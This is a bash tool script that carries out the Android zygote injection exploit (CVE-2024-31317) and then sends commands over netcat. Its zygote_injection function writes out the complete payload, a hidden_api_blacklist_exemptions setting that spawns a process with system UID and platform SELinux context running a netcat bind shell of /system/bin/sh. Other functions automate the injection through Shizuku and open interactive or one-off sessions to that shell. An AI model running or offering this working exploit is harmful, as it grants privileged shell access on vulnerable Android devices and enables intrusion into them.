#!/bin/bash
# shellcheck shell=bash

# System Shell Netcat Command Sender
# A utility to setup and send commands to remote servers via netcat.
# Supports interactive mode, command execution, and Android zygote injection setup.
# Reference: https://infosecwriteups.com/exploiting-android-zygote-injection-cve-2024-31317-d83f69265088

readonly SYSNC_VERSION="0.2.0"

# Configuration (override via env vars or --host/--port/--uid flags).
NC_HOST="${NC_HOST:-localhost}"
NC_PORT="${NC_PORT:-1234}"
NC_UID="${NC_UID:-1000}"

# =============================================================================
# FUNCTIONS
# =============================================================================

show_help() {
    cat <<EOF
System Shell Netcat Command Sender (v${SYSNC_VERSION})
=====================================

Usage: sysnc [OPTIONS]

Options:
  -c, --command CMD     Send a single command (quote it if it contains spaces)
  -s, --setup           Setup netcat server (system shell via zygote injection)
      --uid UID         Specify UID for setup (must be >= 1000, default: ${NC_UID})
  -k, --kill            Kill the running netcat server
      --host HOST       Server host (default: ${NC_HOST}, env: NC_HOST)
      --port PORT       Server port (default: ${NC_PORT}, env: NC_PORT)
  -v, --version         Show version
  -h, --help            Show this help message
  (no args)             Interactive connection to server

Examples:
  sysnc                          # Interactive mode
  sysnc -c "ls -la"              # Send a single command
  sysnc -s                       # Setup server with default UID (${NC_UID})
  sysnc -s --uid 1000            # Setup server with explicit UID
  sysnc -k                       # Kill the running server
  sysnc --host 10.0.0.5 --port 4444 -c "id"
  cat script.sh | sysnc          # Pipe a script and close connection

For system shell setup, ensure rish (Shizuku) is installed and accessible.
EOF
}

show_version() {
    echo "sysnc ${SYSNC_VERSION}"
}

die() {
    echo "Error: $1" >&2
    [ -n "${2:-}" ] && echo "   $2" >&2
    exit 1
}

# Generate shell profile setup commands (for sh shell).
# Uses _sysnc_-prefixed locals to avoid clobbering the remote shell's USER/HOSTNAME.
generate_shell_profile() {
    cat <<'PROFILE_EOF'
export TERM="${TERM:-xterm-256color}"

_sysnc_user=$(whoami 2>/dev/null || id -un 2>/dev/null || echo 'user')
_sysnc_host=$(hostname 2>/dev/null || cat /proc/sys/kernel/hostname 2>/dev/null || echo 'device')
_sysnc_green=$(printf '\033[0;32m')
_sysnc_yellow=$(printf '\033[1;33m')
_sysnc_cyan=$(printf '\033[0;36m')
_sysnc_reset=$(printf '\033[0m')

set_prompt() {
    _pwd="$PWD"
    case "$_pwd" in
        "$HOME") _pwd='~' ;;
        "$HOME"/*) _pwd="~${_pwd#"$HOME"}" ;;
    esac
    PS1="${_sysnc_green}${_sysnc_user}${_sysnc_reset}@${_sysnc_yellow}${_sysnc_host}${_sysnc_reset}:${_sysnc_cyan}${_pwd}${_sysnc_reset}$ "
}

set_prompt

cd() {
    command cd "$@" || return
    set_prompt
}
PROFILE_EOF
}

# Open an interactive netcat session, sending `sh -i` and the shell profile
# setup before yielding to the user's terminal via `cat`.
connect_interactive() {
    {
        echo "sh -i"
        generate_shell_profile
        cat
    } | nc "$NC_HOST" "$NC_PORT" || die "Failed to connect to $NC_HOST:$NC_PORT" \
        "Make sure the netcat server is running and accessible. Run 'sysnc -h' for more info."
}

# Android zygote injection payload.
# The literal newlines inside the format string are required: the exploit
# parses the value as a multi-line argv-like blob, with each --flag on its own line.
zygote_injection() {
    local uid=${1:-$NC_UID}
    printf 'settings put global hidden_api_blacklist_exemptions "LClass1;->method1(
15
--runtime-args
--setuid=%s
--setgid=%s
--runtime-flags=2049
--mount-external-full
--target-sdk-version=29
--setgroups=3003
--nice-name=runnetcat
--seinfo=platform:isSystemServer:privapp:targetSdkVersion=29:complete
--invoke-with
toybox nc -s 127.0.0.1 -p %s -L /system/bin/sh -l;
--instruction-set=arm
--app-data-dir=/data/
--package-name=com.android.settings
android.app.ActivityThread
"\n' "$uid" "$uid" "$NC_PORT"
}

stop_setting()      { echo "am force-stop com.android.settings"; }
start_setting()     { echo "am start -a android.settings.SETTINGS"; }
clean_up_setting()  { echo "settings delete global hidden_api_blacklist_exemptions"; }

# Try to kill an existing netcat server. `quiet` mode suppresses the
# "already closed" message for the pre-setup cleanup pass.
kill_server() {
    local quiet="${1:-}"
    [ "$quiet" = "quiet" ] || echo "Killing netcat server..."
    if echo "pkill -f 'nc.*$NC_PORT'" | nc -N -w 2 "$NC_HOST" "$NC_PORT" 2>/dev/null; then
        sleep 2
        [ "$quiet" = "quiet" ] || echo "   [OK] Netcat server killed"
    else
        [ "$quiet" = "quiet" ] || echo "   [INFO] No running server found on $NC_HOST:$NC_PORT"
    fi
}

setup_server() {
    local uid=$NC_UID

    # --uid is consumed in the pre-pass; anything left after -s is unexpected.
    shift
    [ $# -eq 0 ] || die "Unexpected argument '$1' after -s/--setup" \
                        "Run 'sysnc -h' for more information"

    if ! [[ "$uid" =~ ^[0-9]+$ ]] || [ "$uid" -lt 1000 ]; then
        die "UID must be a number >= 1000" "Provided UID: $uid"
    fi

    echo "Setting up system shell netcat server using Android Zygote Injection"
    echo "   Using UID: $uid"
    echo ""

    if ! command -v rish &>/dev/null; then
        {
            echo "Error: rish (Shizuku) is not installed or not in PATH"
            echo ""
            echo "Setup Instructions:"
            echo "   1. Install Shizuku: https://github.com/RikkaApps/Shizuku"
            echo "   2. Setup rish with Shizuku"
            echo ""
            echo "OR run these commands manually via 'adb shell':"
            echo ""
            echo "# 1) Stop the Settings app"
            stop_setting
            echo ""
            echo "# 2) Inject zygote payload (paste the whole multi-line block as one command)"
            zygote_injection "$uid"
            echo ""
            echo "# 3) Restart the Settings app"
            start_setting
            echo ""
            echo "# 4) Clean up hidden-API exemptions"
            clean_up_setting
        } >&2
        exit 1
    fi

    # Best-effort cleanup of any prior server (quiet — first-run is expected to find nothing).
    kill_server quiet

    echo "Step 1: Stopping Android Settings app..."
    rish -c "$(stop_setting)" || die "Failed to stop settings app"
    echo "   [OK] Settings app stopped"

    echo "Step 2: Executing Zygote Injection exploit..."
    rish -c "$(zygote_injection "$uid")" || die "Failed to execute zygote injection"
    echo "   [OK] Netcat server started via zygote injection"

    echo "Step 3: Restarting Settings app..."
    rish -c "$(start_setting)" || die "Failed to restart settings app"
    echo "   [OK] Settings app restarted"

    # Give the Settings app time to re-read the injected hidden-API exemption
    # before we wipe it; otherwise the zygote spawn can race the cleanup.
    sleep 2

    echo "Step 4: Cleaning up hidden API exemptions..."
    rish -c "$(clean_up_setting)" || die "Failed to clean up hidden API exemptions"
    echo "   [OK] Cleanup completed"

    echo ""
    echo "Netcat server setup complete!"
    echo "   Server: $NC_HOST:$NC_PORT"
    echo "   UID:    $uid"
    echo "   Usage:  sysnc -c \"command\"  or  sysnc"
}

send_command() {
    local cmd="$1"
    # -w 5 caps the wait if the server is unreachable; the command is fully
    # buffered up-front, so the idle-timeout aspect of -w doesn't truncate output.
    echo "$cmd" | nc -N -w 5 "$NC_HOST" "$NC_PORT" \
        || die "Failed to connect to $NC_HOST:$NC_PORT" \
               "Make sure the netcat server is running and accessible."
}

# =============================================================================
# MAIN EXECUTION
# =============================================================================

command -v nc &>/dev/null || die "netcat (nc) is not installed or not in PATH"

# Pre-pass: extract --host, --port, and --uid (they can appear anywhere) so
# subsequent action parsing can use the resolved values.
args=()
while [ $# -gt 0 ]; do
    case "$1" in
        --host)
            [ $# -ge 2 ] || die "--host requires an argument"
            NC_HOST="$2"
            shift 2
            ;;
        --port)
            [ $# -ge 2 ] || die "--port requires an argument"
            NC_PORT="$2"
            shift 2
            ;;
        --uid)
            [ $# -ge 2 ] || die "--uid requires an argument"
            NC_UID="$2"
            shift 2
            ;;
        *)
            args+=("$1")
            shift
            ;;
    esac
done
# ${array[@]+...} expands to its content only when the array has elements,
# so an empty args[] cleanly produces no positional parameters.
set -- ${args[@]+"${args[@]}"}

# Handle piped input (only when no flags were given).
if [ ! -t 0 ] && [ $# -eq 0 ]; then
    nc -N "$NC_HOST" "$NC_PORT" \
        || die "Failed to connect to $NC_HOST:$NC_PORT" \
               "Make sure the netcat server is running and accessible."
    exit 0
fi

if [ $# -eq 0 ]; then
    connect_interactive
    exit 0
fi

case "$1" in
    -h|--help)
        show_help
        ;;
    -v|--version)
        show_version
        ;;
    -s|--setup)
        setup_server "$@"
        ;;
    -k|--kill)
        kill_server
        ;;
    -c|--command)
        [ $# -ge 2 ] || die "Command argument required after -c/--command" \
                            "Run 'sysnc -h' for more information"
        send_command "${*:2}"
        ;;
    *)
        die "Invalid argument '$1'" "Run 'sysnc -h' for more information"
        ;;
esac
